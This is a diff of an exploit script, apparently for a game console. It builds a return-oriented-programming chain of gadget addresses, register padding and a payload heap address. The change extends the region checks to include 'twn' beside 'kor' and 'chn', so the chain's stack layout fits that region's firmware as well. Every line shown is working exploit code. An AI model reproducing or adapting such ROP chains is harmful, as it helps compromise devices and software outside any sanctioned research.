@@ -141,7 +141,7 @@ rop += "bbbb" # r4
 rop += "cccc" # r5
 rop += "dddd" # r6
 rop += p(gpu_enqueue_gadget)
-if REGION not in ('kor', 'chn'):
+if REGION not in ('kor', 'chn', 'twn'):
     rop += "aaaa" # skipped
 rop += p(4)
 rop += p(payload_heap_addr)
@@ -151,7 +151,7 @@ rop += p(0)
 rop += p(0)
 rop += p(8)
 rop += p(0)
-if REGION in ('kor', 'chn'):
+if REGION in ('kor', 'chn', 'twn'):
     rop += "aaaa" # skipped (with KOR the above gxcmd buffer is at sp+0 instead of sp+4, but stackframe size is the same)
 rop += "AAAA" # r4
 rop += "AAAA" # r5
@@ -159,7 +159,7 @@ rop += "AAAA" # r6
 rop += "AAAA" # r7
 rop += "AAAA" # r8
 rop += "AAAA" # r9
-if REGION not in ('kor', 'chn'):
+if REGION not in ('kor', 'chn', 'twn'):
     rop += "AAAA" # r10
     rop += "AAAA" # r11
 rop += p(pop_r0_pc) # pc
